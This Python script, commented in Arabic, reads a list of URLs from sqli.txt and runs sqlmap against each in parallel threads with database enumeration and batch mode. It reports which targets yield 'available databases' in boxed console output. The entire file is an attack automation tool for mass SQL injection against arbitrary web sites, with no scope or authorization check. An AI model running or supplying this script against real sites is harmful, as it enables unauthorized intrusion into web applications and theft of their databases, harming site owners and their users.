import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed

# قراءة الروابط من الملف sqli.txt
with open('sqli.txt', 'r') as file:
    urls = file.readlines()

# إزالة المسافات البيضاء والأسطر الجديدة
urls = [url.strip() for url in urls]

# وظيفة لإنشاء مستطيل يحتوي على نصين (Running و Done) مع وضع الرقم في منتصف العنوان
def print_in_box(running_text, done_text, counter):
    length = max(len(running_text), len(done_text))  # اختيار الطول الأطول بين النصين
    box_width = length + 2  # عرض المستطيل بناءً على طول النص
    counter_str = f"[{counter}]"  # صيغة الرقم
    
    # حساب المسافة لوضع الرقم في منتصف خط المستطيل العلوي
    padding_left = (box_width - len(counter_str)) // 2
    padding_right = box_width - len(counter_str) - padding_left
    
    # طباعة المستطيل مع الرقم في المنتصف
    print(f"┌{'─' * padding_left}{counter_str}{'─' * padding_right}┐")
    print(f"│ {running_text.ljust(length)} │")
    print(f"│ {done_text.ljust(length)} │")
    print(f"└{'─' * (length + 2)}┘")

# وظيفة لتنفيذ sqlmap والتحقق من وجود "available databases"
def check_sqli(url, counter):
    running_text = f'Running: {url}'
    
    command = ['sqlmap', '-u', url, '--dbs', '--batch']
    
    # تنفيذ sqlmap وجمع المخرجات
    result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # التحقق من وجود "available databases" في المخرجات
    if "available databases" in result.stdout:
        done_text = 'Done'
    else:
        done_text = 'No databases found'

    return running_text, done_text, counter

# استخدام ThreadPoolExecutor لتنفيذ الفحوصات بالتوازي
with ThreadPoolExecutor(max_workers=5) as executor:  # يمكنك تغيير max_workers لزيادة أو تقليل عدد الخيوط
    futures = {executor.submit(check_sqli, url, i + 1): i + 1 for i, url in enumerate(urls)}
    
    for future in as_completed(futures):
        counter = futures[future]
        running_text, done_text, _ = future.result()
        
        # طباعة المستطيل مع النصوص والرقم في المنتصف
        print_in_box(running_text, done_text, counter)
        print()  # سطر فارغ للفصل بين الفحوصات
